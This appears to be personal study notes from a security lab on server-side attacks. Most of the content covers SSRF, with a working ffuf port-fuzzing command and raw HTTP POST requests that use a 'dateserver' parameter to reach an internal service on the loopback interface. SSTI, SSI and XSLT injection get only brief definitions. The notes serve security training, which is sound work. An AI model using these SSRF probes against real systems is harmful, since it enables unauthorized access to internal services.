#CWES 


### Common types of server-side attacks:
#### **SSRF: server side request forgery**
An attacks manipulates the server to send requests on their behalf.

Typical case: Server fetches remote resources based on user input, if done incorrectly the attacker might force the server into making arbitrary requests.   Note we can use different URL schemes: HTTP(s), file, gopher, etc.

Example of fuzzing a webrequest to enumerate ports on the server:
```shell
ffuf -w ports.txt -u http://10.129.85.188/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect"
```

Ex: Reaching a hidden application via SSRF:
The /index.php endpoint has a post parameter which lets us send requests on the behalf of the server. And with the fuzzing above we found out an application is running on port 8000. We cannot access it directly via the browser - probably not exposed, or connection is blocked by firewall. 
```
POST /index.php HTTP/1.1
Host: 10.129.85.188
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://10.129.85.188
Connection: keep-alive
Referer: http://10.129.85.188/
Priority: u=0

dateserver=http://127.0.0.1:8000
```
- BUT the server can reach the hidden application via the loopback interface. 

```
POST /index.php HTTP/1.1
Host: 10.129.85.188
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.129.85.188
Connection: keep-alive
Referer: http://10.129.85.188/
Priority: u=0

dateserver=http://10.129.85.188:8000
```
- BUT notice that we cannot access the server via the VPN facing network ip. It does not work, most likely because it does not listens to this address. 


 
 **SSTI: Server side template injection**
Exploiting templating engines and server-side templates to generate responses, ex. HTML content dynamically. 

**SSI: Server side includes injection**
Similar to SSTI, can be used to generate html response from the server and include additional content dynamically. 

 
 **XSLT: Extensible stylesheet language transformations - server side injection** 
XSTL is a language used to transform XML docs into other formats, example html. This vulnerability exploits this type of transformation. 






